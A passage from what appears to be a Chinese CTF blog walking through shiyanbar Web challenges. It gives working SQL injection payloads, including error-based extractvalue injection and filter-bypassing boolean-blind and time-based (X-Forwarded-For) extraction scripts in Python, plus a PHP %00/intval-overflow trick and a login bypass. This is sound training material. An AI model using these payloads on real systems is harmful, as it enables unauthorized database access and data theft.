src="/img/实验吧Web/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注表名</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x3a)) or &apos;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/9.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>猜测flag可能在表ffll44jj中</p><p>注列名</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &apos;ffll44jj&apos;),0x3a)) or &apos;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注数据</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; and extractvalue/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj),0x3a)) or &apos;</span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/11.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>获得flag</p><h3 id="认真一点"><a href="#认真一点" class="headerlink" title="认真一点"></a>认真一点</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/earnest/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/earnest/index.php</a></p><p>输入id=1，页面返回You are in…，输入id等于其他值都返回You are not in，输入id=1’，返回You are not in，输入id=1”，返回You are in，猜测id可能被单引号包裹</p><p>那么我们可以根据返回信息的不同进行基于布尔的注入，但是经过测试，这题过滤了注释符，空格，逗号,substr，同时将or替换为空字符串，替换的解决方法是双写or绕过，过滤了空格可以用括号代替，substr用mid代替，过滤了逗号，可以用mid from  for</p><p>给出脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/earnest/index.php"</span></span><br><span class="line">all_string = <span class="string">'''qwertyuiopasdfghjklzxcvbnm `~1234567890!@#$%^&amp;*()-_=+[&#123;]&#125;;:'"\|&lt;,&gt;.?/QWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line">table_name = <span class="string">""</span></span><br><span class="line">column_name = <span class="string">""</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据库名:ctf_sql_bool_blind</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((database())from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of database is: "</span>+j)</span><br><span class="line">            database = database + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"database: "</span>+database)</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据表名:fiag,users</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of table_name is: "</span>+j)</span><br><span class="line">            table_name = table_name + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"table_name: "</span>+table_name)</span><br><span class="line"><span class="comment">#获取fiag下列名:fL$4G</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='fiag'))from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of column_name is: "</span>+j)</span><br><span class="line">            column_name = column_name + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"column_name: "</span>+column_name)</span><br><span class="line"><span class="comment">#获取数据:flag&#123;haha~you win!&#125;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> all_string:</span><br><span class="line">        print(<span class="string">'checking '</span>+j)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'id'</span>:<span class="string">"0'oorr(ascii(mid((select(fL$4G)from(fiag))from("</span>+str(i)+<span class="string">")foorr(1)))="</span>+str(ord(j))+<span class="string">")oorr'0"</span></span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in ................'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">"The "</span>+str(i)+<span class="string">" place of flag is: "</span>+j)</span><br><span class="line">            flag = flag + j</span><br><span class="line">            f = <span class="number">1</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(<span class="string">"flag: "</span>+flag)</span><br></pre></td></tr></table></figure><h3 id="你真的会PHP吗"><a href="#你真的会PHP吗" class="headerlink" title="你真的会PHP吗"></a>你真的会PHP吗</h3><p>网址：<a href="http://ctf5.shiyanbar.com/web/PHP/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/PHP/index.php</a></p><p>抓包发现响应包头部存在提示字段：hint: 6c525af4059b4fe7d8c33a.txt</p><p>访问得到源代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;xxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;number&apos;]))&#123;</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_POST] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br></pre></td></tr></table></figure><p>审计，整理思路，列出主要代码:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">    </span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">      </span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>1.首先必须POST参数number，然后得到关键参数$_REQUEST[‘number’]和$req[‘number’]，$req[‘number’]是通过数组POST遍历获得</p><p>2.$_REQUEST[‘number’]不能是一个数字字符串，且$req[‘number’]通过intval函数取整形值后再转换成字符串必须等于原本的$req[‘number’]</p><p>3.$req[‘number’]通过intval函数取整形值必须等于$req[‘number’]通过strrev函数取回文字符串后再通过intval函数取整形值</p><p>4.$req[‘number’]通过is_palindrome_number函数检测不能是一个回文数</p><p>首先考虑思路的第二步，不能是数字字符串，但是却取整形值后要等于原来的值，看似不可能，但是我们可以通过%00截断is_numeric函数</p><p>接下来考虑思路的第三步和第四步，前后检测是否为回文数明显矛盾，这里解决方法是利用intval函数的溢出</p><p>参考别人的题解里的一句话：intval最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。<br>举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。</p><p>64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>通过上面我们知道服务器的操作系统是32位的，所以我们构造2147483647就可以同时满足2，3条件</p><p>所以赋值number=2147483647%00即可获得flag</p><p>我们可以在本地环境测试一下，给出我本地测试的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;flag&#123;xxxxxxxxxx&#125;&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&apos;number&apos;]))&#123;</span><br><span class="line">   header(&quot;hint:6c525af4059b4fe7d8c33a.txt&quot;);</span><br><span class="line"></span><br><span class="line">   die(&quot;have a fun!!&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach([$_GET] as $global_var) &#123; </span><br><span class="line">    foreach($global_var as $key =&gt; $value) &#123; </span><br><span class="line">        $value = trim($value); </span><br><span class="line">        is_string($value) &amp;&amp; $req[$key] = addslashes($value); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function is_palindrome_number($number) &#123; </span><br><span class="line">    $number = strval($number); </span><br><span class="line">    $i = 0; </span><br><span class="line">    $j = strlen($number) - 1; </span><br><span class="line">    while($i &lt; $j) &#123; </span><br><span class="line">        if($number[$i] !== $number[$j]) &#123; </span><br><span class="line">            return false; </span><br><span class="line">        &#125; </span><br><span class="line">        $i++; </span><br><span class="line">        $j--; </span><br><span class="line">    &#125; </span><br><span class="line">    return true; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">echo &quot;\$_REQUEST[&apos;number&apos;] = &quot;.$_REQUEST[&apos;number&apos;].&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;\$req[&apos;number&apos;] = &quot;.$req[&apos;number&apos;].&apos;&lt;br&gt;&apos;; </span><br><span class="line">echo &quot;is_numeric(\$_REQUEST[&apos;number&apos;]) = &quot;.is_numeric($_REQUEST[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;intval(\$req[&apos;number&apos;]): &quot;.intval($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;\$value1 = intval(\$req[&apos;number&apos;]) = &quot;.intval($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;strrev(\$req[&apos;number&apos;]) = &quot;.strrev($req[&apos;number&apos;]).&apos;&lt;br&gt;&apos;;</span><br><span class="line">echo &quot;\$value2 = intval(strrev(\$req[&apos;number&apos;])) = &quot;.intval(strrev($req[&quot;number&quot;])).&apos;&lt;br&gt;&apos;;</span><br><span class="line"></span><br><span class="line">if(is_numeric($_REQUEST[&apos;number&apos;]))&#123;</span><br><span class="line">   $info=&quot;sorry, you cann&apos;t input a number!&quot;;</span><br><span class="line"></span><br><span class="line">&#125;elseif($req[&apos;number&apos;]!=strval(intval($req[&apos;number&apos;])))&#123;</span><br><span class="line">     $info = &quot;number must be equal to it&apos;s integer!! &quot;;  </span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">     $value1 = intval($req[&quot;number&quot;]);</span><br><span class="line">     $value2 = intval(strrev($req[&quot;number&quot;]));  </span><br><span class="line"></span><br><span class="line">     if($value1!=$value2)&#123;</span><br><span class="line">          $info=&quot;no, this is not a palindrome number!&quot;;</span><br><span class="line">     &#125;else&#123;</span><br><span class="line">          </span><br><span class="line">          if(is_palindrome_number($req[&quot;number&quot;]))&#123;</span><br><span class="line">              $info = &quot;nice! &#123;$value1&#125; is a palindrome number!&quot;; </span><br><span class="line">          &#125;else&#123;</span><br><span class="line">             $info=$flag;</span><br><span class="line">          &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo $info;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>赋值number=2147483647%00</p><p>执行结果如下：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/12.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看到%00成功截断了函数is_numeric，而intval函数会忽略%00，所以strval的值等于原来的值，思路的第二步成功</p><p>再看$req[‘number’]通过strrev函数处理的结果是7463847412，但是再经过intval函数处理结果依旧是原来的2147483647，这就是intval函数溢出，因为2147483647已经是最大值了，大于这个最大值的数经过intval函数处理都是2147483647，而2147483647经过is_palindrome_number函数处理一定返回false，因为它本来就不是回文数</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/13.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最终获得的flag</p><h3 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗??"></a>登陆一下好吗??</h3><p>不要怀疑，我已经过滤了一切,还再逼你注入，哈哈哈哈哈!</p><p>flag格式：ctf{xxxx}</p><p>解题链接：<a href="http://ctf5.shiyanbar.com/web/wonderkun/web/index.html" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/web/index.html</a> </p><p>考察SQL注入，猜测后台SQL如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'$username'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'$password'</span></span><br></pre></td></tr></table></figure><p>尝试使用： <strong>‘=’</strong> ，SQL语句就变成：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">''</span>=<span class="string">''</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">''</span>=<span class="string">''</span></span><br></pre></td></tr></table></figure><p>按照逻辑，从左往右： <strong>username=’’</strong>  然后 <strong>‘’=’’</strong> 为真，<strong>password</strong> 也一样，类似下面：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/36.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>所以我们账号和密码都填 <strong>‘=’</strong> ，即可获得flag。</p><h3 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h3><p>我要把攻击我的人都记录db中去!</p><p>解题链接：<a href="http://ctf5.shiyanbar.com/web/wonderkun/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/wonderkun/index.php</a> </p><p>发现题目会记录用户的IP地址，并记录到数据库中，那么我们就想到使用 <strong>HTTP</strong> 数据包头部的 <strong>X-Forwarded-For</strong> 字段伪造IP，进行 <strong>SQL</strong> 注入。尝试使用 <strong>payload</strong> ： <strong>1’ and sleep(3) and ‘1</strong> ，发现成功执行。</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/37.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>接下来，我们使用 <strong>payload</strong> ： <strong>1’ and if(substr((select flag from flag),1,1),sleep(3),0) and ‘1</strong> ，发现逗号被过滤了：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/38.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>那么我们可以换成下面这种结构： <strong>1’ and (select case when substr((select flag from flag) from 1 for 1)=’c’ then sleep(3) else 0 end) and ‘1</strong><br><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/实验吧Web/39.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure></p><p>接下来编写脚本跑一下就行了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span></span><br><span class="line">chars = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> chars:</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span> : <span class="string">"1' and (select case when substr((select flag from flag) from %s for 1)='%s' then sleep(5) else 0 end) and '1"</span> % (i,ch)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += ch</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span>(ch == <span class="string">"&#125;"</span>):</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>这题flag为：<strong>ctf{cdbf14c9551d5be5612f7bb5d2867853}</strong> 因为网络非常不稳定，直接给出flag。</p><h3 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h3><p>网址：<a href="http://ctf5.shiyanbar.com/423/web/" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/423/web/</a></p><p>注入点为id,数字型注入，过滤了注释符#，–+，id被单引号包裹</p><p>此外还过滤了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union ,select ,order ,by ,table_schema,column_name,information_schema.columns</span><br></pre></td></tr></table></figure><p>用行注释符代替空格，就不用去考虑过滤的问题，再想办法构造where ‘1，或者select 1 ‘ 闭合最后的单引号</p><p>爆数据库payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 